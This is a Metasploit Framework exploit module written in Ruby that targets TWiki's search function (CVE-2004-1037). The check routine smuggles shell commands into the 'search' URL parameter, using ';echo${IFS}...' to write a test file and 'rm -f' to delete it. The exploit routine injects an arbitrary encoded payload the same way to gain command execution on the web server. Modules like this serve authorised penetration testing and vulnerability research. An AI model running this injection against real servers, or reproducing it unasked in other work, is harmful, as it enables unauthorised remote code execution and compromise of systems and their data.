##
# $Id: twiki_search.rb 9671 2010-07-03 06:21:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TWiki Search Function Arbitrary Command Execution',
			'Description'    => %q{
					This module exploits a vulnerability in the search component of TWiki.
				By passing a 'search' parameter containing shell metacharacters to the
				'WebSearch' script, an attacker can execute arbitrary OS commands.
			},
			'Author'         =>
				[
					# Unknown - original discovery
					'jduck'       # metasploit version
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9671 $',
			'References'     =>
				[
					[ 'CVE', '2004-1037' ],
					[ 'OSVDB', '11714' ],
					[ 'BID', '11674' ],
					[ 'URL', 'http://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithSearch' ]
				],
			'Privileged'     => true, # web server context
			'Payload'        =>
				{
					'DisableNops' => true,
					'BadChars'    => ' ',
					'Space'       => 1024,
				},
			'Platform'       => [ 'unix' ],
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Oct 01 2004',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI', [ true, "TWiki bin directory path", "/twiki/bin" ]),
			], self.class)
	end


	def check
		content = rand_text_alphanumeric(16+rand(16))
		test_file = rand_text_alphanumeric(8+rand(8))
		cmd_base = datastore['URI'] + '/view/Main/WebSearch?search='
		test_url = datastore['URI'] + '/view/Main/' + test_file

		# first see if it already exists (it really shouldn't)
		res = send_request_raw({
				'uri' => test_url
			}, 25)
		if (not res) or (res.body.match(content))
			print_error("WARNING: The test file exists already!")
			return Exploit::CheckCode::Safe
		end

		# try to create it
		print_status("Attempting to create #{test_url} ...")
		search = rand_text_numeric(1+rand(5)) + "\';echo${IFS}" + content + "${IFS}>" + test_file + ".txt;#\'"
		res = send_request_raw({
				'uri' => cmd_base + Rex::Text.uri_encode(search)
			}, 25)
		if (not res) or (res.code != 200)
			return Exploit::CheckCode::Safe
		end

		# try to run it, 500 code == successfully made it
		res = send_request_raw({
				'uri' => test_url
			}, 25)
		if (not res) or (not res.body.match(content))
			return Exploit::CheckCode::Safe
		end

		# delete the tmp file
		print_status("Attempting to delete #{test_url} ...")
		search = rand_text_numeric(1+rand(5)) + "\';rm${IFS}-f${IFS}" + test_file + ".txt;#\'"
		res = send_request_raw({
				'uri' => cmd_base + Rex::Text.uri_encode(search)
			}, 25)
		if (not res) or (res.code != 200)
			print_error("WARNING: unable to remove test file (#{test_file})")
		end

		return Exploit::CheckCode::Vulnerable
	end


	def exploit

		search = rand_text_alphanumeric(1+rand(8))
		search << "';" + payload.encoded + ";#\'"

		query_str = datastore['URI'] + '/view/Main/WebSearch'
		query_str << '?search='
		query_str << Rex::Text.uri_encode(search)

		res = send_request_cgi({
				'method'    => 'GET',
				'uri'	      => query_str,
			}, 25)

		if (res and res.code == 200)
			print_status("Successfully sent exploit request")
		else
			raise RuntimeError, "Error sending exploit request"
		end

		handler
	end

end